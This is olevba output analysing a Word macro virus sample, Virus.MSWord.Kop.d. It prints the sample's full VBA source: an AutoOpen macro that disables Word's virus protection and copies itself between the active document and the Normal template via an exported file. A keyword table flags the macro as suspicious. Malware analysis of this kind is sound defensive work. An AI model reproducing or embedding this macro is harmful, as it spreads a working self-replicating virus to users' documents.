olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kop.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kop.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO KOPIEREN.bas 
in file: Virus.MSWord.Kop.d - OLE stream: 'Macros/VBA/KOPIEREN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Options.VirusProtection = False
If NormalTemplate.VBProject.VBComponents.Item("KOPIEREN").Name <> "KOPIEREN" Then
ActiveDocument.VBProject.VBComponents("kopieren").Export "c:\KOPIEREN.vxd"
Set KOP = NormalTemplate.VBProject
NotInNorm = True
ElseIf ActiveDocument.VBProject.VBComponents.Item("KOPIEREN").Name <> "KOPIEREN" Then
NormalTemplate.VBProject.VBComponents("kopieren").Export "c:\kopieren.vxd"
Set KOP = ActiveDocument.VBProject
NotInActiv = True
End If
If NotInNorm = True Or NotInActiv = True Then KOP.VBComponents.Import ("c:\KOPIEREN.vxd")
If NotInActiv = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

